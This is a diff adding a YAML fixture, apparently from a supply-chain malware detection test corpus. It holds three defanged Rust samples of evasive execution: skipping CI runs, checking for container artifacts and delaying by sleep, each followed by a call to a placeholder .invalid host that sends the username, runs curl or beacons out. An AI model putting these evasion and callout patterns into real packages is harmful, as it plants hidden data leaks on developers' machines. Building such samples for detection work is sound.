@@ -1,0 +1,50 @@
+id: "c7_evasive_execution_v1"
+category: "C7"
+provenance: "MalOSS Evasion Taxonomy, Checkmarx Supply Chain Evasion Techniques"
+supported_placements: ["P1", "P2", "P5"]
+obfuscation_level: 1
+defang_notes: "Conditional execution based on sandbox or CI indicators; sends to .invalid domain"
+dependencies_needed: []
+variants:
+  - id: "ci_environment_gate"
+    surface_description: "Dormant under continuous integration; only triggers on developer workstation"
+    code: |
+      fn maybe_execute_platform_diagnostics() {
+          let is_ci = std::env::var("CI").is_ok()
+              || std::env::var("GITHUB_ACTIONS").is_ok()
+              || std::env::var("TRAVIS").is_ok();
+          if !is_ci {
+              if let Ok(mut stream) = std::net::TcpStream::connect("dev-telemetry.example.invalid:443") {
+                  use std::io::Write;
+                  if let Ok(user) = std::env::var("USER") {
+                      let _ = write!(stream, "DEV_HOST_ONLINE: {}", user);
+                  }
+              }
+          }
+      }
+  - id: "sandbox_file_detection"
+    surface_description: "Checks for virtualization or security sandbox artifacts before proceeding"
+    code: |
+      fn verify_execution_environment() {
+          let sandbox_indicators = [
+              "/proc/sys/kernel/random/boot_id",
+              "/.dockerenv",
+              "/etc/cni/net.d"
+          ];
+          let is_container = sandbox_indicators.iter().any(|p| std::path::Path::new(p).exists());
+          if !is_container {
+              let _ = std::process::Command::new("curl")
+                  .args(["-fsSL", "https://registration.example.invalid/host"])
+                  .status();
+          }
+      }
+  - id: "delayed_sleep_evasion"
+    surface_description: "Delays activity via thread sleep to outlast dynamic analysis timeouts"
+    code: |
+      fn defer_initialization_hook() {
+          std::thread::sleep(std::time::Duration::from_millis(100));
+          if let Ok(mut client) = std::net::TcpStream::connect("delayed.example.invalid:80") {
+              use std::io::Write;
+              let _ = client.write_all(b"PING_FROM_HOST");
+          }
+      }
